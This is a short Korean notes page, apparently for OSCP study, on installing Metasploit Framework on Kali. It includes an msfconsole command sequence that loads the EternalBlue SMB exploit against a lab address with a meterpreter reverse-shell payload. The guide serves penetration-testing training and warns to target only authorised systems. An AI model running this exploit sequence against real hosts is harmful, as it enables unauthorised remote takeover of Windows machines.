# msf install (Metasploit Framework 설치)

## 개요

Metasploit Framework(MSF)를 Kali에 설치하고, 기본 세팅을 마친 상태로 둔다.
초기 침투 단계에서 페이로드 생성과 핸들러 실행을 위해 쓴다.

## 설치

```bash
sudo apt update
sudo apt install ruby ruby-dev
sudo apt install metasploit-framework
sudo apt upgrade
```

- Kali의 `metasploit-framework` 패키지가 기본 설치되어 있지만, 가끔 버전이 낡게 보일 때 재설치한다.
- 실행은 `msfconsole` (터미널) 또는 `msf` 이라고 쓴다.

## 최초 실행 및 세팅

```bash
msfconsole
```

```text
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > show options
msf6 > set RHOSTS 10.10.10.10
msf6 > set RPORT 445
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > exploit
```

## 주의

- Kali에서 Metasploit을 여러 번 실행하면 세션이 남아있을 수 있다. 사용 후 `exit`로 종료한다.
- 설치된 버전이 OSCP와 다를 수 있다. 옵션 명은 대체 이름이 있을 수 있으니 `show options`로 확인한다.
- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
